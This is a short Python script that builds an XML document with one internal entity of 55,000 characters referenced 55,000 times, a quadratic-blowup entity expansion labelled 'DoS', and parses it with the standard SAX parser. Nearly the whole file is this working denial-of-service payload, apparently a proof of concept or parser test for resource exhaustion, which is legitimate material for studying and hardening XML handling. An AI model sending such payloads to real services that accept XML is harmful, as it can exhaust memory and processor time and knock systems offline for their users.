#!/usr/bin/env python3
# coding: UTF-8

import xml.sax as sax

class ExampleContentHandler(sax.ContentHandler):
    def __init__(self):
        sax.ContentHandler.__init__(self)
 
    def startElement(self, name, attrs):
        pass
 
    def endElement(self, name):
        pass
 
    def characters(self, content):
        pass

size = 55000
entity = 'A' * size
refs = '&x;' * size
data = '''\
<?xml version="1.0"?>
<!DOCTYPE DoS [
    <!ENTITY x "{entity}">
]>
<DoS>{entityReferences}</DoS>
'''.format(entity=entity, entityReferences=refs)

sax.parseString(data, ExampleContentHandler())
